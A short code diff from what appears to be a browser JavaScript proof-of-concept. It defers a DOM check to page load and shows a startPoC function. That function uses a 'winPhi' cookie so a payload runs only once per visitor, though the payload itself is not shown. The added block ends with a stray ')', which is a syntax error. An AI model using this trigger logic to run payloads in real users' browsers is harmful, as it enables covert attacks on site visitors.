@@ -105,7 +105,9 @@ function checkDOM() {
     startPoC();
   }
 }
-checkDOM();
+window.onload = function() {
+  checkDOM();
+});
 function startPoC() {
   // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
   if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
